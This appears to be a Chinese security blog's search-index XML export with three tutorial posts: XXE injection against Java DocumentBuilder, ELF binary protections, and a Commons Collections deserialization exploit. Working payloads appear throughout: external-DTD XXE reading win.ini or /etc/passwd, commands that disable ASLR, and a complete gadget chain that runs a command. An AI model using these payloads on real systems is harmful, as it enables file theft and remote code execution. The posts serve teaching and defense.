<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XML注入之DocumentBuilder]]></title>
    <url>%2F2019%2F02%2F13%2FXML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder%2F</url>
    <content type="text"><![CDATA[何为DocumentBuilderDocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。 常规用法Demo先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 解析代码： 123456789101112131415161718192021222324public class test &#123; public static void main(String[] args)&#123; File f = new File("user.xml"); documentBuilder(f); &#125; public static void documentBuilder(File f)&#123; DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance(); try &#123; DocumentBuilder builder=factory.newDocumentBuilder(); //解析xml文档，先获取 Document doc=builder.parse(f); //通过user名字来获取dom节点 NodeList nodeList=doc.getElementsByTagName("user"); Element e=(Element)nodeList.item(0); //获取值 System.out.println("姓名："+e.getElementsByTagName("name").item(0).getFirstChild().getNodeValue()); System.out.println("性别："+e.getElementsByTagName("sex").item(0).getFirstChild().getNodeValue()); System.out.println("年龄："+e.getElementsByTagName("age").item(0).getFirstChild().getNodeValue()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行后，发现成功解析了user.xml的内容： XML注入1、测试是否支持解析DTD：创建test.xml，内容如下，主要添加了DTD即DOCTYPE： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 测试代码中将user.xml改为test.xml。 运行代码，效果和Demo一样，即说明支持解析DTD。 这里注意一点，当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装。 2、测试是否支持解析普通实体：修改test.xml内容如下，主要添加ELEMENT： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo EMPTY&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 发现可以正常解析。 3、测试是否支持解析参数实体：修改test.xml内容如下，主要修改ELEMENT为ENTITY实体： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;&amp;foo;&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 运行代码，发现可正常解析，且成功进行了XML实体注入： 4、测试是否支持解析外部实体：修改test.xml内容如下，主要修改为SYSTEM执行访问外部链接： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://127.0.0.1/Mi1k7ea.dtd&quot;&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; 在攻击者的服务器（这里自己开启一个Web服务）的Web目录放置一个Mi1k7ea.dtd文件，内容如下，其中e:/secret.ini为本地的一个敏感文件： 1&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; 当然在Linux系统可以将双引号内的内容改为”file:///etc/passwd”来读取passwd文件内容。 运行代码，发现成功通过远程加载解析DTD文件读取了本地文件内容： 当然，外部实体还有另一种写法，如下： 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY % milk SYSTEM &quot;http://127.0.0.1/Mi1k7ea.dtd&quot;&gt; %milk; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; 运行结果和上面是一样的。 进一步利用… 检测方法1、在Java项目中搜索javax.xml.parsers下的DocumentBuilderFactory和DocumentBuilder，排查是否使用了该API解析XML文档内容； 2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能。 防御方法正确地设置setFeature()来进行防御：]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELF安全防御机制小结]]></title>
    <url>%2F2019%2F02%2F09%2FELF%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[这里主要介绍一下Linux下ELF文件的一些安全防御机制及其原理，其在二进制安全和Pwn上经常会碰到，至于各个类型的绕过技巧后面会补充。 NX（DEP）NX即No-eXecute（不可执行）的意思，NX（即Windows上类似的DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 通常开启了NX后，即使有栈溢出漏洞也执行不了写在栈上的shellcode，但是可通过ROP方式来绕过NX跳转至其他地方执行。 gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。例如：gcc -z execstack -o test test.c 在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。 网上找的示例图： PIE（ASLR）PIE（Position-Independent Executables）位置无关的可执行文件，和Windows下的ASLR（Address Space Layout Randomization)机制类似，PIE enabled表示程序开启地址随机化选、意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址。 一般情况下NX（DEP）和PIE（ASLR）会同时工作。 PIE机制有以下三种情况： ​ 0 - 表示关闭进程地址空间随机化。 ​ 1 - 表示将mmap的基址，stack和vdso页面随机化。 ​ 2 - 表示在1的基础上增加栈（heap）的随机化。 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。 Built as PIE：位置独立的可执行区域PIE。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程ROP（return-oriented programming）方法变得难得多。 liunx下关闭PIE的命令如下：sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space RELRORELRO（Relocation Read Only）重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。通过设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，保护库函数的调用不受攻击者重定位的影响，从而减少对GOT（Global Offset Table）攻击。 RELRO有Partial RELRO和FULL RELRO两个选项，如果开启FULL RELRO，意味着无法修改GOT表；如果为Partial RELRO，说明对GOT表具有写权限。 可通过ROP绕过。 FORTIFYFortify 技术是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 strcpy、memcpy,、memset等函数自动替换成相应的 __strcpy_chk(dst, src, dstlen)等函数，达到防止缓冲区溢出的作用。 FORTIFY_SOURCE机制对格式化字符串有两个限制： ​ (1)包含%n的格式化字符串不能位于程序内存中的可写地址； ​ (2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。 GCC中-D_FORTIFY_SOURCE=2是默认开启的，但是只有开启O2或以上优化的时候，这个选项才会被真正激活。 如果指定-D_FORTIFY_SOURCE=1，那同样也要开启O1或以上优化，这个选项才会被真正激活。 可以使用-U_FORTIFY_SOURCE或者-D_FORTIFY_SOURCE=0来禁用。 如果开启了-D_FORTIFY_SOURCE=2，那么调用__printf_chk函数的时候会检查format string中是否存在%n，如果存在%n 而且format string是在一个可写的segment中的（不是在read-only内存段中），那么程序会报错并终止。如果是开启-D_FORTIFY_SOURCE=1，那么就不会报错。 CANARY（Stack）Stack，栈溢出检查，用Canary是否变化来检测，其中Canary found表示开启。 Canary是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。 如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。 参考Pwn基础知识笔记 软件常用安全防护手段 checksec 总结]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化漏洞]]></title>
    <url>%2F2019%2F02%2F06%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[在学习Java反序列化漏洞之前，建议先熟悉Java序列化和反序列化机制。 在反序列化漏洞中，Java类反序列化漏洞较PHP和Python的相比，显得稍微复杂一些。主要是要求对Java较为熟悉。下面小结一下Java反序列化漏洞的相关内容。 何为Java反序列化漏洞当开发者自定义实现Serializable、添加自己的readObject()方法时，若readObject()方法内代码逻辑存在缺陷，则可能存在Java反序列化漏洞的风险。如果此时Java服务的反序列化API允许外部用户使用，则会导致攻击者使用精心构造的payload来利用反序列化漏洞达到任意代码执行的目的。 Java反序列化中readObject()方法的作用相当于PHP反序列化中的魔术函数，使反序列化过程在一定程度上受控成为可能，是否真的可控，还需分析每个对象的readObject()方法具体是如何实现的。通常情况下，在Java的readObject()方法中很少会像CTF中PHP的反序列化漏洞题目一样直接将漏洞代码写在该方法中，这时就需要去构造反射链来进行任意代码执行。 重写readObject()示例Java反序列化漏洞的根源在于重写readObject()方法导致存在漏洞代码。 readObject()方法重写的格式如下： 1private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException 注意，readObject()方法被定义成了private，并且是必须尝试捕获IOException和ClassNotFoundException的异常。 这里再贴另外一个简单的示例，创建一个不安全的类对象，赋值其name属性并序列化为文件保存起来，接着通过反序列化该文件获取该对象及其属性值，通过重写readObject()方法在调用默认的readObject()方法之后添加一条执行计算器的代码： 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class test &#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = "Mi1k7ea"; System.out.println("[*]序列化对象"); FileOutputStream fos = new FileOutputStream("object.ser"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(Unsafe); os.close(); fos.close(); System.out.println("[*]反序列化文件中保存的序列化对象"); FileInputStream fis = new FileInputStream("object.ser"); ObjectInputStream ois = new ObjectInputStream(fis); UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); fis.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec("calc.exe"); &#125;&#125; 可以看到，在readObject()方法调用时Java的序列化机制会先寻找用户是否自定义了readObject()方法，若有则直接调用该自定义的方法而非默认的readObject()方法： Apache Commons Collections反序列化漏洞分析Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，包含了很多jar工具包，提供了很多强有力的数据结构类型并且实现了各种集合工具类。 org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set、list、queue等等，它们是集合类型。换一种理解方式，collection是set、list、queue的抽象。 作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。 影响版本：3.2.1及以下版本的Commons Collections包。 下面就简单地模拟该序列化漏洞产生、payload的构造及利用过程。这里示例用的commons-collections-3.2.1.jar包。 漏洞点Apache Commons Collections中有一个特殊的接口Transformer，其中有一个实现该接口的类InvokerTransformer可以通过调用Java的反射机制来调用任意函数，其源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class InvokerTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = -8653385846894047688L; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; public static Transformer getInstance(String methodName) &#123; if (methodName == null) &#123; throw new IllegalArgumentException("The method to invoke must not be null"); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) &#123; if (methodName == null) &#123; throw new IllegalArgumentException("The method to invoke must not be null"); &#125; else if (paramTypes == null &amp;&amp; args != null || paramTypes != null &amp;&amp; args == null || paramTypes != null &amp;&amp; args != null &amp;&amp; paramTypes.length != args.length) &#123; throw new IllegalArgumentException("The parameter types must match the arguments"); &#125; else if (paramTypes != null &amp;&amp; paramTypes.length != 0) &#123; paramTypes = (Class[])((Class[])paramTypes.clone()); args = (Object[])((Object[])args.clone()); return new InvokerTransformer(methodName, paramTypes, args); &#125; else &#123; return new InvokerTransformer(methodName); &#125; &#125; private InvokerTransformer(String methodName) &#123; this.iMethodName = methodName; this.iParamTypes = null; this.iArgs = null; &#125; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist"); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed"); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6); &#125; &#125; &#125;&#125; 可以看到该InvokerTransformer类是实现Transformer接口的（Transformer接口主要用于转换并返回一个给定的Object对象），且其中的transform()方法采用反射机制进行任意函数调用，这就是漏洞点所在。 这里是反射机制关键的三句代码： 123Class cls = input.getClass();Method method = cls.getMethod(this.iMethodName, this.iParamTypes);return method.invoke(input, this.iArgs); 第一句：input为Object对象，获取其对应的Class； 第二句：获取cls类中具体的方法对象； 第三句：执行input对象的method方法，返回同method一样的返回类型。 上述三句代码其实等同于下面的代码，即可以直接合并起来： 1input.getClass().getMethod(this.iMethodName, this.iParamTypes).invoke(input, this.iArgs); 下面编写代码进行弹出计算器的测试来验证该漏洞点是否能利用： 123456789public class POC_Test&#123; public static void main(String[] args) throws Exception &#123; InvokerTransformer it = new InvokerTransformer( "exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;); it.transform(java.lang.Runtime.getRuntime()); &#125;&#125; 可以看到是可以弹出计算器的，即可以进行漏洞利用，但是有个问题，就是我们不能从外部直接传入java.lang.Runtime.getRuntime()，这时就需要我们去构造链式结构的payload来实现漏洞利用。 下面就开始构造反射链payload来实现反序列化漏洞的利用。 1、通过反射构造可序列化的恶意反射链对象一步步来，我们知道，要让Java程序执行执行命令，通常是获取到Runtime的实例，再调用它的exec()执行命令： 12Runtime runtime = Runtime.getRuntime();runtime.exec(cmd); 接着将其表示为链式结构的形式，因为底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的： 1java.lang.Runtime.getRuntime().exec(cmd) 好了，我们知道构造的反射链是这种格式，下面开始分析Commons Collections的payload的链式结构。 Commons Collections中有一个用于对象之间转换的Transformer接口，先看构造的链式结构payload中涉及到的几个实现类，只需看其构造方法和transform()方法即可。 1、ConstantTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，可看到transform()方法会原封不动地返回传入的Object，从而可构造外部输入的常量如Runtime.class： 1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn;&#125;public Object transform(Object input) &#123; return this.iConstant;&#125; 2、InvokerTransformer类，在漏洞点中已说明。 3、ChainedTransformer类，是一个Transformer接口实现类，其构造方法和transform()方法如下，其transform()方法用于链接多个步骤构造的transformer，其中object参数为上一次调用transform()的返回结果： 12345678910public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers;&#125;public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object;&#125; 接着看下面这段构造的payload链式结构： 1234567Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;),&#125;;Transformer transformerChain = new ChainedTransformer(transformers); 构造过程如下： 构造一个ConstantTransformer对象，把Runtime的Class对象传进去，在transform()时，始终会返回这个对象； 构造一个InvokerTransformer对象，待调用方法名为getMethod，参数为getRuntime，在transform()时，传入第一步的结果，此时的input应该是java.lang.Runtime，但经过getClass()之后，cls为java.lang.Class，之后getMethod()只能获取java.lang.Class的方法，因此才会定义的待调用方法名为getMethod，然后其参数才是getRuntime，它得到的是getMethod这个方法的Method对象，invoke()调用这个方法，最终得到的才是getRuntime这个方法的Method对象； 构造一个InvokerTransformer对象，待调用方法名为invoke，参数为空，在transform()时，传入第二步的结果，同理，cls将会是java.lang.reflect.Method，再获取并调用它的invoke()方法，实际上是调用上面的getRuntime()拿到Runtime对象； 构造一个InvokerTransformer对象，待调用方法名为exec，参数为命令字符串，在transform()时，传入第三步的结果，获取java.lang.Runtime的exec方法并传参调用； 最后把它们组装成一个数组全部放进ChainedTransformer中，在transform()时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求。 有一个问题——上面的第2、3步是不是可以简化一下，考虑用下面这种逻辑更清晰的方式来构造呢？ 1234Transformer[] trans = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer("getRuntime", new Class[0], new Object[0]), new InvokerTransformer("exec", new Class[] &#123; String.class &#125;, new Object[] &#123; cmd &#125;)&#125;; 答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于Runtime.getRuntime()得到的是一个对象，这个对象也需要参与序列化过程，而Runtime本身是没有实现Serializable接口的，所以会导致序列化失败。 构造完这条Transformer链，就等着谁来执行它的transform()了。 这里可以先直接在代码下面添加transformerChain.transform(null);语句来查看该Transformer链是否真的可以执行命令且该对象是否可以被序列化，代码示例如下： 1234567891011121314151617181920public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); //测试我们的恶意对象是否可以被序列化 ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(transformerChain); //执行以下语句就可以调用起计算器 transformerChain.transform(null); &#125;&#125; 执行之后程序没报错，即该Transformer链可以进行序列化，并且在执行transformerChain.transform(null);时成功弹出计算器： 该Transformer链没有问题，下面就是找Commons Collections中哪些地方可以执行该Transformer链的transform()方法以及寻找含有自定义有漏洞的readObject()方法的类了。 2、查找自定义readObject()方法且存在漏洞代码的类如网上所说，在JDK较早的版本中存在AnnotationInvocationHandler类 ，其类对象在初始化时可以传入一个Map类型参数赋值给字段memberValues，readObject()过程中如果满足一定条件就会对memberValues中的元素进行setValue()。 但是，在较新版本的JDK中AnnotationInvocationHandler没有了setValue()方法，但是可以使用BadAttributeValueExpException类来实现。由于本地环境的JDK为较新的版本，因此就只暂时对BadAttributeValueExpException类进行分析。 BadAttributeValueExpException 下面看下BadAttributeValueExpException类定义，可以看到定义了一个名为val的对象类型属性，且自定义了readObject()方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class BadAttributeValueExpException extends Exception &#123; /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of &#123;@code attribute.toString()&#125; */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) &#123; this.val = val == null ? null : val.toString(); &#125; /** * Returns the string representing the object. */ public String toString() &#123; return "BadAttributeValueException: " + val; &#125; private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get("val", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName(); &#125; &#125; &#125; 查看自定义的readObejct()方法，其中在满足System.getSecurityManager() == null时会调用 valObj.toString()，从攻击思路上看，其他的条件都是无法满足的。因此valObj.toString()就成为了突破口，此时要找到一个合适的工具在toString()方法被调用的时候会触发我们构造的恶意代码。 3、查找可通过toString()触发transform()方法的合适的类从BadAttributeValueExpException类的readObejct()方法知道，关注点在valObj.toString()中，那么现在就需要找到一个合适的类在调用toString()方法时触发transform()方法来执行我们构造的反射链。 LazyMap——调用get()方法触发transform()方法 LazyMap是Commons-collections 3.1提供的一个工具类，是Map的一个实现，主要的内容是利用工厂设计模式，在用户get一个不存在的key的时候执行一个方法来生成Key值，当且仅当get行为存在的时候Value才会被生成。其定义代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; private static final long serialVersionUID = 7990956402564206740L; protected final Transformer factory; public static Map decorate(Map map, Factory factory) &#123; return new LazyMap(map, factory); &#125; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Factory factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException("Factory must not be null"); &#125; else &#123; this.factory = FactoryTransformer.getInstance(factory); &#125; &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException("Factory must not be null"); &#125; else &#123; this.factory = factory; &#125; &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; out.defaultWriteObject(); out.writeObject(this.map); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); this.map = (Map)in.readObject(); &#125; public Object get(Object key) &#123; if (!this.map.containsKey(key)) &#123; Object value = this.factory.transform(key); this.map.put(key, value); return value; &#125; else &#123; return this.map.get(key); &#125; &#125;&#125; LazyMap测试代码，在get一个不存在的key的时候执行一个方法来生成Key值，下面的代码运行结果会调用transform()输出”Mi1k7ea”： 12345678910public class Test&#123; public static void main(String[] args) throws Exception &#123; Map targetMap = LazyMap.decorate(new HashMap(), new Transformer() &#123; public Object transform(Object input) &#123; return "Mi1k7ea"; &#125; &#125;); System.out.println(targetMap.get("hhhhhhhh")); &#125;&#125; TiedMapEntry——调用toString()方法触发getValue()方法（即LazyMap.get()） TiedMapEntry也存在于Commons-collections 3.1，该类主要的作用是将一个Map绑定到Map.Entry下，形成一个映射。 主要代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public Object getKey() &#123; return this.key; &#125; public Object getValue() &#123; return this.map.get(this.key); &#125; public Object setValue(Object value) &#123; if (value == this) &#123; throw new IllegalArgumentException("Cannot set value to this map entry"); &#125; else &#123; return this.map.put(this.key, value); &#125; &#125; public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof Entry)) &#123; return false; &#125; else &#123; boolean var10000; label43: &#123; label29: &#123; Entry other = (Entry)obj; Object value = this.getValue(); if (this.key == null) &#123; if (other.getKey() != null) &#123; break label29; &#125; &#125; else if (!this.key.equals(other.getKey())) &#123; break label29; &#125; if (value == null) &#123; if (other.getValue() == null) &#123; break label43; &#125; &#125; else if (value.equals(other.getValue())) &#123; break label43; &#125; &#125; var10000 = false; return var10000; &#125; var10000 = true; return var10000; &#125; &#125; public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public String toString() &#123; return this.getKey() + "=" + this.getValue(); &#125;&#125; 分析下这个类，首先是toString()中调用了getValue()，而getValue()中实际是map.get(key)，如此一来就构建起了整个调用链接了。 构造过程小结BadAttributeValueExpException 这里将上述分析的调用过程做个图清晰地列出来，相信应该很明确该反射链执行的过程了： 最终构造的代码 1234567891011121314151617181920212223242526272829303132333435363738public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); //利用反射的方式来向对象传参 Field valfield = val.getClass().getDeclaredField("val"); valfield.setAccessible(true); valfield.set(val, entry); test t = new test(); t.deserialize(t.serialize(val)); &#125; public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125;&#125; 运行结果，弹出计算器： 检测方法全局搜索ObjectInputStream类，检查是否调用readObject()方法，若存在该方法则检查其是否进行了重写，若重写了readObject()方法则需严格排查是否可构造反射链来执行任意命令。 当然，结合其他几个类型的Java反序列漏洞，全局搜索的类方法如下： 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject 防御方法常见的方法，就是在ObjectInputStream中设置黑白名单机制的方式进行防御。 参考Java反序列化漏洞的原理分析 Java反序列化漏洞从入门到深入 Java反序列化漏洞分析 浅析Java序列化和反序列化]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java序列化和反序列化机制]]></title>
    <url>%2F2019%2F02%2F03%2FJava%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%2F</url>
